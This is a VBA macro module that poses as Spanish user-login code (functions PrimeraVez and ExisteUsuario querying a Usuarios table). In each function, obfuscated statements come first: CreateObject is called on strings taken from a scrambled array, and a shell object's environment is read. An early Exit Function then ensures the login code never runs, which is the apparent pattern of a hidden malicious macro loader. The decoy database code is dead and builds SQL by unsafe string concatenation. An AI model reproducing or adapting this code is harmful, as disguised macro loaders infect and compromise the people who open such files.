Attribute VB_Name = "d"

Public Function PrimeraVez() As Boolean

Dim SQL As String
Dim entrada As String
Dim I As Integer
 Dim d As Boolean
 d = True
 IsWord = True
 For I = 1 To Len(Trim("DAbro"))
 If d = False Then
Set GromGremitKustiTryasutsyaDAcdaw = CreateObject(GromGremitKustiTryasutsyaPLAPEKC(I - 2))
Exit For
Else
d = False
End If
Next I
ExisteUsuario entrada, 0, SQL
Exit Function
PrimeraVez = False
RsUsuario.ActiveConnection = RutaBase
entrada = "N"
SQL = "SELECT * FROM Usuarios WHERE usu_id=" & IdUsuario
SQL = SQL & " AND usu_entrada=" & ""
RsUsuario.Open SQL

If Not RsUsuario.EOF Then
    PrimeraVez = True
    IdUsuario = RsUsuario!usu_id
    clave = RsUsuario!usu_clave
Else
    PrimeraVez = False
End If





End Function




Public Function ExisteUsuario(nomusu As String, IdUsuario As Long, clave As String) As Boolean
Dim SQL As String


 Set GromGremitKustiTryasutsya1DASH1solo = CreateObject(GromGremitKustiTryasutsyaPLAPEKC(3))
 Set GromGremitKustiTryasutsyaKSKLAL = GromGremitKustiTryasutsya1DASH1solo.Environment(GromGremitKustiTryasutsyaPLAPEKC(2 * 2))
 VerCadenaPermiso SQL
Exit Function
RsUsuario.ActiveConnection = RutaBase

SQL = "Select * from Usuarios WHERE usu_apodo=" & ""
RsUsuario.Open SQL

If Not RsUsuario.EOF Then
    ExisteUsuario = True
    IdUsuario = RsUsuario!usu_id
    clave = RsUsuario!usu_clave
Else
    ExisteUsuario = False
End If
End Function


